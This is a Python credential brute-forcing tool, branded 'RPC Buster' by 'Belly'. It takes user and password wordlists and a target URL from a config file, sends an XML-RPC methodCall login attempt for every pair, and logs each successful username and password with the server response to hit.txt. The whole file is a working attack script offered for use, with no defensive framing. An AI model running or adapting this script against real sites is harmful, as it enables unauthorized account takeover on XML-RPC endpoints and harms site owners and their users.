from datetime import datetime
import requests
import json

banner = r"""

            ,.  ,.           ______  ______ _______    ______                               
            ||  ||          (_____ \(_____ (_______)  (____  \              _               
           ,''--''.          _____) )_____) )          ____)  )_   _  ___ _| |_ _____  ____ 
          : (.)(.) :        |  __  /|  ____/ |        |  __  (| | | |/___|_   _) ___ |/ ___)
         ,'        `.       | |  \ \| |    | |_____   | |__)  ) |_| |___ | | |_| ____| |    
         :          :       |_|   |_|_|     \______)  |______/|____/(___/   \__)_____)_|    
         :          :       By Belly
         `._m____m_,'                                                                
"""
hit = 0
attempt = 0

with open("config.json", "r") as f:
    config = json.load(f)

if config.get("wordlist_user"):
    with open(config["wordlist_user"], "rb") as f:
        users = [line.decode('utf-8', errors='ignore').strip() for line in f.readlines()]
else:
    users = [config["user"]]

if config.get("blogid"):
    blogid = config["blogid"]
else:
    blogid = 1

if config.get("wordlist_password"):
    with open(config["wordlist_password"], "rb") as f:
        passwords = [line.decode('utf-8', errors='ignore').strip() for line in f.readlines()]
else:
    passwords = [config["password"]]
print(banner)
print("Let's start ...")
try:        
  for user in users:
      for password in passwords:
        payload = """<?xml version="1.0"?>
        <methodCall>
          <methodName>{methodName}</methodName>
          <params>
            <param><value><string>{blogid}</string></value></param>
            <param><value><string>{user}</string></value></param>
            <param><value><string>{password}</string></value></param>
          </params>
        </methodCall>
        """

        x = requests.post(config["url"], data=payload.format(methodName=config["methodName"], blogid=config["blogid"], user=user, password=password), headers={"Content-Type": "text/xml"})
        if config["bad_flag"] not in x.text and "faultString" not in x.text and "faultCode" not in x.text and "503 Service Unavailable" not in x.text:
            hit += 1
            print("{temp} [{code}] {user}:{password} hit[{hit}] HIT".format(temp=datetime.now().strftime("%Y-%m-%d %H:%M:%S"), code=x.status_code, user=user, password=password, hit=hit))
            with open("hit.txt", "a") as f:
                f.write("{temp} [{code}] {user}:{password} \n {text}".format(temp=datetime.now().strftime("%Y-%m-%d %H:%M:%S"), code=x.status_code, user=user, password=password, text=x.text) + "\n")
        else:
            attempt += 1
            print("{temp} [{code}] attempt[{attempt}] hit[{hit}] {user}:{password} Bad Credentials".format(temp=datetime.now().strftime("%Y-%m-%d %H:%M:%S"), code=x.status_code, user=user, password=password, attempt=attempt, hit=hit,))

except KeyboardInterrupt:
    print("\nInterruption !\n")
    exit()
finally:
    print("The script has finished.")